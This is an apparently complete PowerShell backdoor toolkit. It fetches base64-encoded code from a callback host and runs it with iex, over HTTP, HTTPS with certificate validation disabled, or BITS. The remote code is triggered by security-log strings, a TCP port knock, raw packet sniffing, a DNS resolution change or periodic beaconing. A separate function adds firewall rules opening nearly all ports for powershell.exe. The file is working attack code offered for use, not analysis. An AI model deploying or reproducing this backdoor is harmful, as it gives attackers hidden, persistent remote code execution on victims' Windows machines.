







function Invoke-CallbackIEX
{

	Param(
	[Parameter(Mandatory=$True,Position=1)]
	[string]$CallbackIP,
	[Parameter(Mandatory=$False,Position=2)]
	[int]$Method=0,
	[Parameter(Mandatory=$False,Position=3)]
	[string]$BitsTempFile="$env:temp\ps_conf.cfg",
	[Parameter(Mandatory=$False,Position=4)]
	[string]$resource="/favicon.ico",
	[Parameter(Mandatory=$False,Position=5)]
	[bool]$Silent=$false
	)
	
	
	if($CallbackIP)
	{
		try {
			
			if ($Method -eq 0)
			{
				
				$url="http://$CallbackIP$resource"
				if(-not $Silent) {write-host "Calling home with method $method to: $url"}
				
				$enc = (new-object net.webclient).downloadstring($url)
			}
			
			elseif ($Method -eq 1)
			{
				[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
				$url="https://$CallbackIP$resource"
				if(-not $Silent) {write-host "Calling home with method $method to: $url"}
				
				$enc = (new-object net.webclient).downloadstring($url)
			}
			
			elseif ($Method -eq 2)
			{
				$url="http://$CallbackIP$resource"
				if(-not $Silent) { write-host "Calling home with method $method to: $url"
				write-host "BITS Temp output to: $BitsTempFile"}
				Import-Module *bits*
				Start-BitsTransfer $url $BitsTempFile -ErrorAction Stop
				
				$enc = Get-Content $BitsTempFile -ErrorAction Stop
				
				
				Remove-Item $BitsTempFile -ErrorAction SilentlyContinue
				
			}
			else 
			{
				if(-not $Silent) { write-host "Error: Improper callback method" -fore red}
				return 0
			}
			
			
			if ($enc)
			{
				
				$b = [System.Convert]::FromBase64String($enc)
				$dec = [System.Text.Encoding]::UTF8.GetString($b)
				
				
				iex $dec
			}
			else
			{
				if(-not $Silent) { write-host "Error: No Data Downloaded" -fore red}
				return 0
			}
		}
		catch [System.Net.WebException]{
			if(-not $Silent) { write-host "Error: Network Callback failed" -fore red}
			return 0
		}
		catch [System.FormatException]{
			if(-not $Silent) { write-host "Error: Base64 Format Problem" -fore red}
			return 0
		}
		catch [System.Exception]{
			if(-not $Silent) { write-host "Error: Uknown problem during transfer" -fore red}
			
			return 0
		}
	}
	else
	{
		if(-not $Silent) { write-host "No host specified for the phone home :(" -fore red}
		return 0
	}
	
	return 1
}

function Add-PSFirewallRules
{

	Param(
	[Parameter(Mandatory=$False,Position=1)]
	[string]$RuleName="Windows Powershell",
	[Parameter(Mandatory=$False,Position=2)]
	[string]$ExePath="C:\windows\system32\windowspowershell\v1.0\powershell.exe",
	[Parameter(Mandatory=$False,Position=3)]
	[string]$Ports="1-65000"
	)

	If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
	{
		Write-Host "This command requires Admin :(... get to work! "
		Return
	}
	
	
	$fw = New-Object -ComObject hnetcfg.fwpolicy2
	$rule = New-Object -ComObject HNetCfg.FWRule
	$rule.Name = $RuleName
	$rule.ApplicationName=$ExePath
	$rule.Protocol = 6
	$rule.LocalPorts = $Ports
	$rule.Direction = 2
	$rule.Enabled=$true
	$rule.Grouping="@firewallapi.dll,-23255"
	$rule.Profiles = 7
	$rule.Action=1
	$rule.EdgeTraversal=$false
	$fw.Rules.Add($rule)
	
	
	$rule = New-Object -ComObject HNetCfg.FWRule
	$rule.Name = $RuleName
	$rule.ApplicationName=$ExePath
	$rule.Protocol = 17
	$rule.LocalPorts = $Ports
	$rule.Direction = 2
	$rule.Enabled=$true
	$rule.Grouping="@firewallapi.dll,-23255"
	$rule.Profiles = 7
	$rule.Action=1
	$rule.EdgeTraversal=$false
	$fw.Rules.Add($rule)
	
	
	$rule = New-Object -ComObject HNetCfg.FWRule
	$rule.Name = $RuleName
	$rule.ApplicationName=$ExePath
	$rule.Protocol = 6
	$rule.LocalPorts = $Ports
	$rule.Direction = 1
	$rule.Enabled=$true
	$rule.Grouping="@firewallapi.dll,-23255"
	$rule.Profiles = 7
	$rule.Action=1
	$rule.EdgeTraversal=$false
	$fw.Rules.Add($rule)
	
	
	$rule = New-Object -ComObject HNetCfg.FWRule
	$rule.Name = $RuleName
	$rule.ApplicationName=$ExePath
	$rule.Protocol = 17
	$rule.LocalPorts = $Ports
	$rule.Direction = 1
	$rule.Enabled=$true
	$rule.Grouping="@firewallapi.dll,-23255"
	$rule.Profiles = 7
	$rule.Action=1
	$rule.EdgeTraversal=$false
	$fw.Rules.Add($rule)

}

function Invoke-EventLoop
{

	Param(
	[Parameter(Mandatory=$True,Position=1)]
	[string]$CallbackIP,
	[Parameter(Mandatory=$False,Position=2)]	
	[string]$Trigger="SIXDUB", 
	[Parameter(Mandatory=$False,Position=3)]
	[int]$Timeout=0,
	[Parameter(Mandatory=$False,Position=4)]
	[int] $Sleep=1
	)

	If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
	{
		Write-Host "This backdoor requires Admin :(... get to work! "
		Return
	}
	
	write-host "Timeout: $Timeout"
	write-host "Trigger: $Trigger"
	write-host "CallbackIP: $CallbackIP"
	write-host
	write-host "Starting backdoor..."
	
	
	$running=$true
	$match =""
	$starttime = get-date
	while($running)
	{
		
		if ($Timeout -ne 0 -and ($([DateTime]::Now) -gt $starttime.addseconds($Timeout)))  
		{
			$running=$false
		}
		
		$d = Get-Date
		$NewEvents = Get-WinEvent -FilterHashtable @{logname='Security'; StartTime=$d.AddSeconds(-$Sleep)} -ErrorAction SilentlyContinue | fl Message | Out-String
		
		
		if ($NewEvents -match $Trigger)
		{
				$running=$false
				$match = $CallbackIP
				write-host "Match: $match"
		}
		sleep -s $Sleep
	}
	if($match)
	{
		$success = Invoke-CallbackIEX $match
	}
}

function Invoke-PortBind
{

	Param(
	[Parameter(Mandatory=$False,Position=1)]
	[string]$CallbackIP,
	[Parameter(Mandatory=$False,Position=2)]
	[string]$LocalIP, 
	[Parameter(Mandatory=$False,Position=3)]
	[int]$Port=4444, 
	[Parameter(Mandatory=$False,Position=4)]
	[string]$Trigger="QAZWSX123", 
	[Parameter(Mandatory=$False,Position=5)]
	[int]$Timeout=0
	)
	
	
	if (-not $LocalIP) 
	{
		route print 0* | % { 
			if ($_ -match "\s{2,}0\.0\.0\.0") { 
				$null,$null,$null,$LocalIP,$null = [regex]::replace($_.trimstart(" "),"\s{2,}",",").split(",")
				}
			}
	}
	
	
	write-host "!!! THIS BACKDOOR REQUIRES FIREWALL EXCEPTION !!!"
	write-host "Timeout: $Timeout"
	write-host "Port: $Port"
	write-host "Trigger: $Trigger"
	write-host "Using IPv4 Address: $LocalIP"
	write-host "CallbackIP: $CallbackIP"
	write-host
	write-host "Starting backdoor..."
	try{
		
		
		$ipendpoint = new-object system.net.ipendpoint([net.ipaddress]"$localIP",$Port)
		$Listener = new-object System.Net.Sockets.TcpListener $ipendpoint
		$Listener.Start()
		
		
		$running=$true
		$match =""
		$starttime = get-date
		while($running)
		{			
			
			if ($Timeout -ne 0 -and ($([DateTime]::Now) -gt $starttime.addseconds($Timeout)))  
			{
				$running=$false
			}
			
			
			if($Listener.Pending())
			{
				
				$Client = $Listener.AcceptTcpClient()
				write-host "Client Connected!"
				$Stream = $Client.GetStream()
				$Reader = new-object System.IO.StreamReader $Stream
				
				
				$line = $Reader.ReadLine()
				
				
				if ($line -eq $Trigger)
				{
					$running=$false
					$match = ([system.net.ipendpoint] $Client.Client.RemoteEndPoint).Address.ToString()
					write-host "MATCH: $match"
				}
				
				
				$reader.Dispose()
				$stream.Dispose()
				$Client.Close()
				write-host "Client Disconnected"
			}
		}
		
		
		write-host "Stopping Socket"
		$Listener.Stop()
		if($match)
		{
			if($CallbackIP)
			{
				$success = Invoke-CallbackIEX $CallbackIP
			}
			else
			{
				$success = Invoke-CallbackIEX $Match
			}
		}
	}
	catch [System.Net.Sockets.SocketException] {
		write-host "Error: Socket Error" -fore red
	}
}

function Invoke-DNSLoop
{

	param(
		[Parameter(Mandatory=$False,Position=1)]
		[string]$CallbackIP,
		[Parameter(Mandatory=$False,Position=2)]
		[string]$Hostname="yay.sixdub.net",
		[Parameter(Mandatory=$False,Position=3)]
		[string]$Trigger="127.0.0.1",
		[Parameter(Mandatory=$False,Position=4)]
		[int] $Timeout=0,
		[Parameter(Mandatory=$False,Position=5)]
		[int] $Sleep=1
	)
	
	
	write-host "Timeout: $Timeout"
	write-host "Sleep Time: $Sleep"
	write-host "Trigger: $Trigger"
	write-host "Using Hostname: $Hostname"
	write-host "CallbackIP: $CallbackIP"
	write-host
	write-host "Starting backdoor..."
	
	
	$running=$true
	$match =""
	$starttime = get-date
	while($running)
	{
		
		if ($Timeout -ne 0 -and ($([DateTime]::Now) -gt $starttime.addseconds($Timeout)))  
		{
			$running=$false
		}
		
		try {
			
			$ips = [System.Net.Dns]::GetHostAddresses($Hostname)
			foreach ($addr in $ips)
			{
				
				
				$resolved=$addr.IPAddressToString
				if($resolved -ne $Trigger)
				{
					$running=$false
					$match=$resolved
					write-host "Match: $match"
				}
				
			}
		}
		catch [System.Net.Sockets.SocketException]{
			
		}

		sleep -s $Sleep
	}
	write-host "Shutting down DNS Check..."
	if($match)
	{
		if($CallbackIP)
		{
			$success = Invoke-CallbackIEX $CallbackIP
		}
		else
		{
			$success = Invoke-CallbackIEX $Match
		}
	}
}

function Invoke-PacketKnock
{	

	param(
	[Parameter(Mandatory=$False,Position=1)]
	[string]$CallbackIP,
	[Parameter(Mandatory=$False,Position=2)]
	[string]$LocalIP, 
	[Parameter(Mandatory=$False,Position=3)]
	[string]$Trigger="QAZWSX123", 
	[Parameter(Mandatory=$False,Position=4)]
	[int]$Timeout=0
	)
	If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
	{
		Write-Host "This backdoor requires Admin :(... get to work! "
		Return
	}
	
	if (-not $LocalIP) 
	{
		route print 0* | % { 
			if ($_ -match "\s{2,}0\.0\.0\.0") { 
				$null,$null,$null,$LocalIP,$null = [regex]::replace($_.trimstart(" "),"\s{2,}",",").split(",")
				}
			}
	}
	
	
	write-host "!!! THIS BACKDOOR REQUIRES FIREWALL EXCEPTION !!!"
	write-host "Timeout: $Timeout"
	write-host "Trigger: $Trigger"
	write-host "Using IPv4 Address: $LocalIP"
	write-host "CallbackIP: $CallbackIP"
	write-host
	write-host "Starting backdoor..."
	
	
	$byteIn = new-object byte[] 4
	$byteOut = new-object byte[] 4
	$byteData = new-object byte[] 4096  

	$byteIn[0] = 1  
	$byteIn[1-3] = 0
	$byteOut[0-3] = 0
	
	
	$socket = new-object system.net.sockets.socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::IP)
	$socket.setsocketoption("IP","HeaderIncluded",$true)
	$socket.ReceiveBufferSize = 819200

	
	$ipendpoint = new-object system.net.ipendpoint([net.ipaddress]"$localIP",0)
	$socket.bind($ipendpoint)

	
	[void]$socket.iocontrol([net.sockets.iocontrolcode]::ReceiveAll,$byteIn,$byteOut)

	
	$starttime = get-date
	$running = $true
	$match = ""
	$packets = @()
	while ($running)
	{
		
		if ($Timeout -ne 0 -and ($([DateTime]::Now) -gt $starttime.addseconds($Timeout)))  
		{
			$running=$false
		}
		
		if (-not $socket.Available)
		{
			start-sleep -milliseconds 500
			continue
		}
		
		
		$rcv = $socket.receive($byteData,0,$byteData.length,[net.sockets.socketflags]::None)

		
		$MemoryStream = new-object System.IO.MemoryStream($byteData,0,$rcv)
		$BinaryReader = new-object System.IO.BinaryReader($MemoryStream)
		
		
		$trash  = $BinaryReader.ReadBytes(12)
		
		
		$SourceIPAddress = $BinaryReader.ReadUInt32()
		$SourceIPAddress = [System.Net.IPAddress]$SourceIPAddress
		$DestinationIPAddress = $BinaryReader.ReadUInt32()
		$DestinationIPAddress = [System.Net.IPAddress]$DestinationIPAddress
		$RemainderBytes = $BinaryReader.ReadBytes($MemoryStream.Length)
		
		
		$AsciiEncoding = new-object system.text.asciiencoding
		$RemainderOfPacket = $AsciiEncoding.GetString($RemainderBytes)
		
		
		$BinaryReader.Close()
		$memorystream.Close()
		
		
		if ($RemainderOfPacket -match $Trigger)
		{
			write-host "Match: " $SourceIPAddress
			$running=$false
			$match = $SourceIPAddress
		}
	}
	
	if($match)
	{
		if($CallbackIP)
		{
			$success = Invoke-CallbackIEX $CallbackIP
		}
		else
		{
			$success = Invoke-CallbackIEX $Match
		}
	}
	
}

function Invoke-CallbackLoop
{

	Param(  
	[Parameter(Mandatory=$True,Position=1)]
	[string]$CallbackIP,
	[Parameter(Mandatory=$False,Position=2)]
	[int]$Timeout=0,
	[Parameter(Mandatory=$False,Position=3)]
	[int] $Sleep=1
	)
	
		
	write-host "Timeout: $Timeout"
	write-host "Sleep: $Sleep"
	write-host "CallbackIP: $CallbackIP"
	write-host
	write-host "Starting backdoor..."
	
	
	$running=$true
	$match =""
	$starttime = get-date
	while($running)
	{
		
		if ($Timeout -ne 0 -and ($([DateTime]::Now) -gt $starttime.addseconds($Timeout)))  
		{
			$running=$false
		}
		
		$CheckSuccess = Invoke-CallbackIEX $CallbackIP -Silent $true
		
		if($CheckSuccess -eq 1)
		{
			$running=$false
		}
		
		sleep -s $Sleep
	}
	
	write-host "Shutting down backdoor..."
}